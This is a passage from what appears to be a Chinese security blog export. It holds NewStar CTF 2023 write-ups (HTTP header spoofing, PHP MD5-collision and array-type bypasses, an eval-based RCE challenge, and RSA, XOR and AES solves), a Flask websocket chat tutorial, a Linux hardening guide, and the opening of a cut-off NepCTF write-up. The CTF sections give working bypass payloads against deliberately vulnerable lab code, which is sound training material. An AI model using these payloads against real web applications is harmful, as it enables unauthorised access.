简单构造number1和number2：\n\n![image-20230925214220089](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214220089.png)\n\n不是ssti模版注入，想到是整型数字可以正常得出结果，假如是字符会得出什么：\n\n![image-20230925214419173](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214419173.png)\n\n页面500 搜索flag 得到`flag{Y0u_@re_3enset1ve_4bout_deb8g}`\n\n### Begin of HTTP\n\n1. 首先打开目标靶机\n\n   ![image-20230926095210963](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095210963.png)\n\n2. 发现可能首先涉及的是get方式传参数 `ctf`，利用抓包看看效果\n\n   ![image-20230926095403902](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095403902.png)\n\n3. 页面给出提示 ，后续需要利用POST请求给`secret`传值，但是具体传什么还不知道，首先查看源代码\n\n   ![image-20230926095521717](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095521717.png)\n\n4. 发现了小东西：`<!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->` 利用base64解密得到：`n3wst4rCTF2023g00000d`\n\n   ![image-20230926095636943](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095636943.png)\n\n5. 进行post传值`secret=n3wst4rCTF2023g00000d`\n\n   ![image-20230926095957929](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095957929.png)\n\n6. 成功传值后给出下一步提示：发现cookie中存在`power` 于是将power修改为`ctfer`\n\n   ![image-20230926100128656](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100128656.png)\n\n7. 下一步提示需要修改浏览器，即是修改UA  `User-Agent: NewStarCTF2023`\n\n   ![image-20230926100330339](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100330339.png)\n\n8. 继续跟着提示修改`Referer: newstarctf.com` \n\n   ![image-20230926100426655](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100426655.png)\n\n9. 本来以为结束了，既然还有，限制只允许本地用户，首先想到`X-Forwarded-For`，但是尝试了`X-Forwarded-For:127.0.0.1`没有任何效果，继续查阅相关http的资料发现 `x-real-ip`也能限制本地用户\n\n   ![image-20230926100815968](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100815968.png)\n\n10. 得到flag：`flag{17b2edf3-a19b-4e8f-8639-cb2c5edb7000}`\n\n整个题的思路还是很简单，只需要跟着题目的提示来解决就行，主要是要了解http的相关知识。\n\n### Begin of PHP\n\n1. 首先打开靶机看到php代码：\n\n   ```php\n    <?php\n   error_reporting(0);\n   highlight_file(__FILE__);\n   \n   if(isset($_GET['key1']) && isset($_GET['key2'])){\n       echo \"=Level 1=<br>\";\n       if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){\n           $flag1 = True;\n       }else{\n           die(\"nope,this is level 1\");\n       }\n   }\n   \n   if($flag1){\n       echo \"=Level 2=<br>\";\n       if(isset($_POST['key3'])){\n           if(md5($_POST['key3']) === sha1($_POST['key3'])){\n               $flag2 = True;\n           }\n       }else{\n           die(\"nope,this is level 2\");\n       }\n   }\n   \n   if($flag2){\n       echo \"=Level 3=<br>\";\n       if(isset($_GET['key4'])){\n           if(strcmp($_GET['key4'],file_get_contents(\"/flag\")) == 0){\n               $flag3 = True;\n           }else{\n               die(\"nope,this is level 3\");\n           }\n       }\n   }\n   \n   if($flag3){\n       echo \"=Level 4=<br>\";\n       if(isset($_GET['key5'])){\n           if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){\n               $flag4 = True;\n           }else{\n               die(\"nope,this is level 4\");\n           }\n       }\n   }\n   \n   if($flag4){\n       echo \"=Level 5=<br>\";\n       extract($_POST);\n       foreach($_POST as $var){\n           if(preg_match(\"/[a-zA-Z0-9]/\",$var)){\n               die(\"nope,this is level 5\");\n           }\n       }\n       if($flag5){\n           echo file_get_contents(\"/flag\");\n       }else{\n           die(\"nope,this is level 5\");\n       }\n   } \n   ```\n\n   \n\n2. 进行代码审计，发现大概思路是首先输入`key1`和`key2`满足两个输入的值不同但是md5值相同得到flag1 接着满足其他条件依次得到flag2，flag3，flag4，由flag5得到flag\n\n3. 首先找到`key1`和`key2`满足两个输入的值不同但是md5值相同\n\n   ```bash\n   key1= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B\n   \n   key2= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B\n   ```\n\n   ![image-20230926124224070](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124224070.png)\n\n4. 根据提示已经进入level 2 此时要满足`md5($_POST['key3']) === sha1($_POST['key3']`\n\n   像这样的强比较，传入的不是字符串而是数组，不但**md5() 和 sha1()函数**不会报错，结果还会返回**null**，在强比较里面**null=null**为true绕过\n\n   ![image-20230926124757524](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124757524.png)\n\n5. 此时已经显示进入level 3 ，接着满足`strcmp($_GET['key4'],file_get_contents(\"/flag\")`\n\n   strcmp 的参数只能是 字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的\n\n   ![image-20230926125029145](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125029145.png)\n\n6. 现在进入level 4，现在需要满足`!is_numeric($_GET['key5']) && $_GET['key5'] > 2023`\n\n   ![image-20230926125148090](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125148090.png)\n\n7. 最后到达level 5，根据\n\n   ```php\n   \textract($_POST);\n       foreach($_POST as $var){\n           if(preg_match(\"/[a-zA-Z0-9]/\",$var)){\n               die(\"nope,this is level 5\");\n           }\n       }\n       if($flag5){\n           echo file_get_contents(\"/flag\");\n       }\n   ```\n\n   首先要过滤preg_match，接着要构造flag5\n\n   **建议：当初不是很明白，利用phpstudy构造此页面进行测试**\n\n   ```php\n   if($flag4){\n       echo \"=Level 5=<br>\";\n       extract($_POST);\n       print_r($_POST);\n       foreach($_POST as $var){\n           print_r($var);\n           if(preg_match(\"/[a-zA-Z0-9]/\",$var)){\n               die(\"nope,this is level 5-1\");\n           }\n       }\n       if($flag5){\n           echo \"hello\";\n           echo file_get_contents(\"/flag\");\n       }else{\n           die(\"nope,this is level 5-2\");\n       }\n   } \n   ```\n\n   ![image-20230926125720157](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125720157.png)\n\n   绕过`preg_match`,通过`%00``%5c`绕过\n\n   ![image-20230926125430120](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125430120.png)\n\n8. 最后得到flag：`flag{de665d4c-3bbd-44e8-8eba-2b6cfeef881a}`\n\n### R!C!E!\n\n![image-20230926205925939](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926205925939.png)\n\n1. 首先观察给出的php代码：\n\n   ```php\n    <?php\n   highlight_file(__FILE__);\n   if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){\n       $password=md5($_POST['password']);\n       $code=$_POST['e_v.a.l'];\n       if(substr($password,0,6)===\"c4d038\"){\n           if(!preg_match(\"/flag|system|pass|cat|ls/i\",$code)){\n               eval($code);\n           }\n       }\n   } \n   ```\n\n2. 审查代码得知：需要通过POST传参`password`和`e_v.a.l` \n\n   md5碰撞得到：114514的md5值前6为是`c4d038`\n\n   ![image-20230926211145829](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211145829.png)\n\n   涉及到RCE绕过：通配符绕过，内敛执行\n\n   ![image-20230926211050969](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926211050969.png)\n\n## crypto\n\n### brainfuck\n\n`++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.>-----.<<<-.>>++..<.>.++++++.....------.<.>.<<<<<+++.>>>>+.<<<+++++++.>>>+.<<<-------.>>>-.<<<+.+++++++.--..>>>>---.-.<<<<-.+++.>>>>.<<<<-------.+.>>>>>++.`\n\nbrainfuck在线解密：\n\n![image-20230925144213246](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144213246.png)\n\n`flag{Oiiaioooooiai#b7c0b1866fe58e12}`\n\n### Caesar's Secert\n\n`kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}`\n\n凯撒密码解密：\n\n![image-20230925144342795](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144342795.png)\n\n### Fence\n\n`fa{ereigtepanet6680}lgrodrn_h_litx#8fc3`\n\n栅栏密码解密：\n\n![image-20230925144031722](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925144031722.png)\n\n`flag{reordering_the_plaintext#686f8c03}`\n\n\n\n### babyrsa\n\n#### RSA算法\n\n> RSA算法由两个密钥，即公钥和私钥组成。\n>     1）准备两个非常大的素数 p和 q （转换成二进制后 1024个二进制位或者更多，位数越多越难破解）；\n>     2）利用字符串模拟计算大素数 p 和 q 的乘积 m=pq；\n>     3）同样方法计算m=(p-1)(q-1) ，这里的 m是 n 的欧拉函数；\n>     4）找到一个数e (1<e<m)满足 gcd(m,e)=1（即 e 和 m 互素）；\n>     5）计算 e 在模 m 域上的逆元d （即满足ed mod m =1 ）；\n>     6）至此，公钥和私钥生成完毕： (n,e)为公钥， (n,d)为私钥；\n\n**加密：** 对于明文x，用公钥 (n,e)对 x 加密的过程，就是将 x 转换成数字（字符串的话取其 ASCII码或者 unicode 值），然后通过幂取模计算出y ，其中 y就是密文；\n\n![image-20230927095332177](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095332177.png)\n\n**解密：**对于密文y ，用私钥 (n,d) 对 y 进行解密的过程和加密类似，同样是计算幂取模；\n\n![image-20230927095404116](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230927095404116.png)\n\n****\n\n```python\nfrom Crypto.Util.number import *\nfrom flag import flag\n\ndef gen_prime(n):\n    res = 1\n\n    for i in range(15):\n        res *= getPrime(n)\n\n    return res\n\n\nif __name__ == '__main__':\n    n = gen_prime(32)\n    e = 65537\n    m = bytes_to_long(flag)\n    c = pow(m,e,n)\n    print(n)\n    print(c)\n# 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261\n# 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595\n```\n\n经过大素数分解：`17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261`\n\n能分解成：\n\n```bash\n 2217990919<10> \n 2338725373<10> \n 2370292207<10> \n 2463878387<10> \n 2706073949<10> \n 2794985117<10> \n 2804303069<10> \n 2923072267<10> \n 2970591037<10> \n 3207148519<10> \n 3654864131<10> \n 3831680819<10> \n 3939901243<10> \n 4093178561<10> \n 4278428893<10>\n```\n\n根据给出的文件 写出解码脚本：\n\n```python\nimport gmpy2\nfrom Crypto.Util.number import *\n\n# 公钥e\ne = 65537\n\n# 欧拉函数eular euler = (p - 1) * (q - 1)\nnum = [2217990919, 2338725373, 2370292207, 2463878387,2706073949, 2794985117, 2804303069, 2923072267,\n       2970591037, 3207148519, 3654864131, 3831680819,3939901243, 4093178561, 4278428893]\neular = 1\nfor i in num:\n    eular = eular * (i - 1)\n# print(eular)\n\nn = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261\nc = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595\n# 私钥d\nd = gmpy2.invert(e, eular)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m).decode('utf-8', errors='ignore'))\n```\n\n### babyencoding\n\n```bash\npart 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=\npart 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=\npart 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S<R-C`Q9F8S87T`\n```\n\n看到题目 得知：flag由三个部分组成 \n\n1. `part 1 of flag：`**base64**  flag{dazzling_encoding#4e0ad4\n\n2. `part 2 of flag:`**base32**   f0ca08d1e1d0f10c0c7afe422fea7\n\n3. `part 3 of flag: `**UUencode**  c55192c992036ef623372601ff3a}\n\n> flag: flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}\n\n****\n\n\n\n#### UUencode\n\n​\t**简述：**\n\n​\tUUencode是一种二进制到文字的编码，最早在unix邮件系统中使用，全称：Unix-to-Unix  encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。\n\n​\t**举例：**\n\n```bash\n明文：hello,world.\n密文：,:&5L;&\\L=V]R;&0N\n```\n\n​\t**在线解密&工具**：\n\nhttp://www.hiencode.com/uu.html\n\n### babyxor\n\n题目：\n\n```python\nfrom secret import *\n\nciphertext = []\nflag = 'e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2'\nfor f in flag:\n    ciphertext.append(f ^ key)\n\nprint(bytes(ciphertext).hex())\n# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2\n```\n\n解密脚本\n\n```python\nfrom pwn import xor\n\nciphertext = bytes.fromhex('e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2')\n\nfor i in range(256):\n    if b'flag' in xor(bytes([i]), ciphertext):\n        print(xor(bytes([i]), ciphertext))\n```\n\n### babyaes\n\n题目：\n\n```python\nfrom Crypto.Cipher import AES\nimport os\n# from flag import flag\nfrom Crypto.Util.number import *\n\n\ndef pad(data):\n    return data + b\"\".join([b'\\x00' for _ in range(0, 16 - len(data))])\n\n\ndef main():\n    flag_ = pad(flag)\n    key = os.urandom(16) * 2\n    iv = os.urandom(16)\n    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    enc_flag = aes.encrypt(flag_)\n    print(enc_flag)\n\n\nif __name__ == \"__main__\":\n    main()\n# 3657491768215750635844958060963805125333761387746954618540958489914964573229\n# b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'\n```\n\n解题aes，我们需要`密码key`，`偏移量iv`，根据题目提示，加密模式是`AES-CBC`\n\n```python\nfrom Crypto.Cipher import AES\nimport os\n# from flag import flag\nfrom Crypto.Util.number import *\n\n\ndef main():\n    xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229 ^ 1\n    print(xor)\n    out = long_to_bytes(xor)\n    key = out[:16] * 2\n    print(key)\n    iv = bytes_to_long(key[16:]) ^ bytes_to_long(out[16:])\n    iv = long_to_bytes(iv)\n    print(iv)\n    ciphertext = b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    flag = cipher.decrypt(ciphertext)\n    print(flag)\n\n\nif __name__ == \"__main__\":\n    main()\n# 3657491768215750635844958060963805125333761387746954618540958489914964573229\n# b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'\n\n```\n\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"基于Flask+websocket实现在线聊天系统","url":"/基于Flask-websocket实现在线聊天系统/","content":"\n# 基于Flask+websocket实现在线聊天系统\n\n​          web开发就是基于浏览器进行人机交互，当访客登录到指定网址后，不仅可以看到浏览器渲染的画面，同时还可以与后台进行一些操作，再通过浏览器返回后台服务器处理的结果，这段时间一直在摸索利用flask框架来做点有意思的事\n\n## 什么是Flask？\n\n`Flask`是一个轻量级的 Python web 开发框架，它为开发者提供了一个简单、直观的方式来创建 web 应用。由于其“微”特性，你可以从一个简单的单文件应用开始，然后根据需要增加更多功能。\n\n## Websockets 和 Flask-SocketIO\n\n`Websockets` 是一个网络通信协议，允许服务器和客户端之间进行双向实时通信。与传统的 HTTP 请求相比，Websockets 提供了一个持久的连接，使得数据能够实时、高效地在双方之间流动。\n`Flask-SocketIO` 则是一个 Flask 插件，它使得在 Flask 应用中集成 Websockets 变得非常简单。不仅如此，它还提供了一系列的高级功能，如广播、命名空间和房间支持，使得创建复杂的实时应用变得轻而易举。\n\n## 大概功能\n\n用户管理功能：包括账号登录、注册等功能。\n\n好友管理功能：允许用户添加和删除好友。\n\n即时聊天功能：用户可以进行实时的聊天，并且通过@用户名 可以进行私聊。\n\n```bash\n'/'（首页）：如果用户未登录，则重定向到登录页面；否则，重定向到聊天页面。\n'/login'：处理用户登录，检查凭据是否与数据库匹配。\n'/chat'：如果用户已登录，则渲染聊天页面；否则，重定向到登录页面。\n'/logout'：通过删除用户的会话来注销用户。\n'/register'：处理用户注册，检查用户名是否唯一，并将用户添加到数据库中。\n定义WebSocket处理程序：\n\n'message'：处理传入的聊天消息并将其广播到适当的房间。\n'join'：处理用户加入聊天房间并更新房间中在线用户的列表。\n'leave'：处理用户离开聊天房间并更新房间中在线用户的列表。\n在if __name__ == '__main__':部分，创建数据库表并运行应用程序，允许WebSocket通信以实时处理聊天消息。\n```\n\n## 创建在线聊天系统\n\n1. 安装必要的库：\n\n```python\npip install Flask flask-socketio\n```\n\n2. 初始化Flask 应用并集成SocketIO：\n\n```python\nfrom flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify\nfrom flask_socketio import SocketIO, join_room, leave_room, emit\n\n\napp = Flask(__name__)\nsocketio = SocketIO(app)\n```\n\n3. 定义简单的路由一呈现聊天室的前端界面:\n\n```python\n@app.route('/')\ndef index():\n    if 'username' in session:\n        return redirect(url_for('chat'))\n    return render_template('login.html')\n```\n\n4. 为聊天室事件（如加入、发送消息和离开）添加 SocketIO 事件处理函数：\n\n```python\n@socketio.on('join')\ndef join(data):\n    room = data['room']\n    join_room(room)\n    online_users.add(session['username'])\n    emit('update_online_users', {'online_users': list(online_users)}, room=room)\n\n\n@socketio.on('leave')\ndef leave(data):\n    room = data['room']\n    leave_room(room)\n    online_users.remove(session['username'])\n    emit('update_online_users', {'online_users': list(online_users)}, room=room)\n```\n\n5. 最后启动flask应用：\n\n```python\nif __name__ == '__main__':\n    with app.app_context():\n        db.create_all()\n        socketio.run(app, debug=True)\n        # socketio.run(app, host='0.0.0.0', port=80)\n```\n\n## 项目展示\n\n由于篇幅有限，如需系统完整代码，可点击主页添加QQ获取\n\n![image-20230919163904624](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230919163904624.png)\n\n## 总结\n\n借助 Flask 和 Flask-SocketIO，你可以轻松创建一个功能齐全的在线聊天室。而 Websockets 保证了数据在服务器和客户端之间的实时交互，为用户提供了一个无缝的体验。这只是一个基础案例，通过该案例我们可以尝试扩展出很多功能，比如在线客服等，并与数据库等技术结合起来，部署在服务器上实现一个自己的通信系统。\n","tags":["Python","html","javascript","css","flask","websocket"],"categories":["Python"]},{"title":"Linux安全基线检查及加固","url":"/Linux安全基线检查及加固/","content":"\n# Linux安全基线检查及加固\n\n## 系统加固检查点\n\n- 账号安全\n  - 空口令用户\n  - umask值的重要性\n  - su的限制\n  - 密码最长有效期\n  - 密码复杂性\n- 系统安全基线\n  - 检查grub密码\n  - 修改内核网络参数\n  - 禁止Control-Alt-Delete键盘关闭命令\n  - 修改命令历史记录条目数以及时间标签\n  - 设置登录超时时间\n\n### 空口令用户\n\n![image-20230823153358927](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823153358927.png)\n\n利用`cat /etc/shadow`指令，上图**kali**后的为用户的密码，查看用户是否存在空口令，但是，这种方法容易看漏相关信息\n\n1. 空口令和隐藏管理员检查\n\n```bash\n$1 用户名  \n$2 密码占用符\n$3 UID\n$4 组\n```\n\n![image-20230823160310527](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823160310527.png)\n\n使用命令`awk -F: '($2==\"\"){print $1}' /etc/shadow`查看空口令账号  **$1为第一个字段即用户名**\n\n![image-20230823154237648](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823154237648.png)\n\n使用命令`awk -F: '($3==0){print $1}' /etc/passwd`查看UID为0的账号\n\n![image-20230823161402210](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823161402210.png)\n\n### umask值的重要性\n\n![image-20230823162331670](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823162331670.png)\n\n`umask`作用：主要是针对新创建的文件的权限管理，比如你umask设置的是022 那你创建一个新文件默认的权限就是644 (644的二进制 110 010 010)属主读写 同组读 其他用户读\n\n**rwx  =>  r=read(读取) w=write(写入) x(exe)(执行)**\n\n\n\n![image-20230823162541325](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823162541325.png)\n\n### 限制用户使用su\n\n使用命令`vim /etc/pasm.d/su` 修改配置文件，去除第六行的注释符号，表示在wheel组中的用户才能够成功使用su命令，其他用户无法使用。如果需要其他组支持该功能可以添加内容。\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230823164802724.png\" alt=\"image-20230823164802724\" style=\"zoom:80%;\" />\n\n例如：只允许test组用户su到root\n\n`auth required pam_wheel.so group=test`\n\n### 密码最长有效期\n\n在文件`/etc/login.defs` 中进行设置如下参数\n\n```bash\nPASS_MAX_DAYS   180  #密码最长过期天数\nPASS_MIN_DAYS   30  #密码最小过期天数\nPASS_MIN_LEN    12  #密码最小长度\nPASS_WARN_AGE   20   #密码过期警告天数\n```\n\n![image-20230824153717146](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230824153717146.png)\n\n### 密码复杂性\n\n- 文件编辑\n  - `/etc/pam.d/system-auth` \n  - Debian系列系统：`/etc/pam.d/common-password`\n\n#### 密码历史或拒绝重复使用密码是什么？\n\n这个参数控制密码历史。它记录曾经使用过的密码（禁止使用的曾用密码的个数）。当用户设置新的密码时，它会检查密码历史，如果他们要设置的密码是一个曾经使用过的旧密码，将会发出警告提示。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。我设置密码历史为 5。\n\n```bash\n# vi /etc/pam.d/system-auth\npassword  sufficient  pam_unix.so md5 shadow nullok try_first_pass use_authtok remember=5\n```\n\n#### 密码最小长度是什么？\n\n这个参数表示密码的最小长度。当用户设置新密码时，系统会检查这个参数，如果新设的密码长度小于这个参数设置的值，会收到警告提示。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。我设置最小密码长度为 12。\n\n```bash\n# vi /etc/pam.d/system-auth\npassword  requisite   pam_cracklib.so try_first_pass retry=3 minlen=12\n```\n\n`try_first_pass retry=3`：在密码设置交互界面，用户有 3 次机会重设密码。\n\n#### 设置最少的大写字母个数？\n\n这个参数表示密码中至少需要的大写字母的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有大写字母，会收到警告提示。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。我设置密码（中的大写字母）的最小长度为 1 个字母。\n\n```bash\n# vi /etc/pam.d/system-auth\npassword   requisite   pam_cracklib.so try_first_pass retry=3 minlen=12 ucredit=-1\n```\n\n#### 设置最少的小写字母个数？\n\n这个参数表示密码中至少需要的小写字母的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有小写字母，会收到警告提示。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。我设置为 1 个字母。\n\n```bash\n# vi /etc/pam.d/system-auth\npassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 lcredit=-1\n```\n\n#### 设置密码中最少的数字个数？\n\n这个参数表示密码中至少需要的数字的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有数字，会收到警告提示。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。我设置为 1 个数字。\n\n```bash\n# vi /etc/pam.d/system-auth\npassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 dcredit=-1\n```\n\n#### 设置密码中最少的其他字符（符号）个数？\n\n这个参数表示密码中至少需要的特殊符号的个数。这些是密码强度参数，可以让密码更健壮。当用户设置新密码时，系统会检查这个参数，如果密码中没有特殊符号，会收到警告提示。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。我设置为 1 个字符。\n\n```bash\n# vi /etc/pam.d/system-auth\npassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 ocredit=-1\n```\n\n#### 设置账号锁定？\n\n这个参数控制用户连续登录失败的最大次数。当达到设定的连续失败登录次数阈值时，锁定账号。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。\n\n```bash\n# vi /etc/pam.d/system-auth\nauth        required      pam_tally2.so onerr=fail audit silent deny=5\naccount required pam_tally2.so\n```\n\n#### 设定账号解锁时间？\n\n这个参数表示用户解锁时间。如果一个用户账号在连续认证失败后被锁定了，当过了设定的解锁时间后，才会解锁。设置被锁定中的账号的解锁时间（900 秒 = 15分钟）。这个参数可以在 `/etc/pam.d/system-auth` 文件中设置。\n\n```bash\n# vi /etc/pam.d/system-auth\nauth        required      pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900\naccount required pam_tally2.so\n```\n\n来源:https://linux.cn/\n\n### 检查grub密码\n\n\n\n## 弱口令防范，暴力破解防御\n\n- 设置连续输错3次密码，账号锁定3分钟(kali 没有这两个文件)\n\n  - 文件编辑\n    - `/etc/pam.d/system-auth`\n    - `/etc/pam.d/password-auth`\n\n  - 配置内容，在源文件第一行下配置如下两行\n  - `auth required pam_tally2.so deny=3 unlock time=30 enven_deny_root root_unlock_time=30`\n  - `account required pam_tally2.so`\n\n","tags":["基线检查","Linux安全基线","安全基线加固"],"categories":["基线检查","Linux"]},{"title":"NepCTF 2023","url":"/NepCTF-2023/","content":"\n## 与AI共舞的哈夫曼\n\n![image-20230811230746325](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230811230746325.png)\n\n1. 下载文件 源码\n\n```python\nimport heapq\nimport os\n\nclass HuffmanNode:\n    def __init__(self, char, freq):\n        self.char = char\n        self.freq = freq\n        self.left = None\n        self.right = None\n\n    def __lt__(self, other):\n        return self.freq < other.freq\n\ndef build_huffman_tree(frequencies):\n    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]\n    heapq.heapify(heap)\n\n    while len(heap) > 1:\n        left = heapq.heappop(heap)\n        right = heapq.heappop(heap)\n        merged = HuffmanNode(None, left.freq + right.freq)\n        merged.left = left\n        merged.right = right\n        heapq.heappush(heap, merged)\n\n    return heap[0]\n\ndef build_huffman_codes(node, current_code, huffman_codes):\n    if node is None:\n        return\n\n    if node.char is not None:\n        huffman_codes[node.char] = current_code\n        return\n\n    build_huffman_codes(node.left, current_code + '0', huffman_codes)\n    build_huffman_codes(node.right, current_code + '1', huffman_codes)\n\ndef compress(input_file, output_file):\n    with open(input_file, 'rb') as f:\n        data = f.read()\n\n    frequencies = {}\n    for byte in data:\n        if byte not in frequencies:\n            frequencies[byte] = 0\n        frequencies[byte] += 1\n\n    root = build_huffman_tree(frequencies)\n    huffman_codes = {}\n    build_huffman_codes(root, '', huffman_codes)\n\n    compressed_data = ''\n    for byte in data:\n        compressed_data += huffman_codes[byte]\n\n    padding = 8 - len(compressed_data) % 8\n    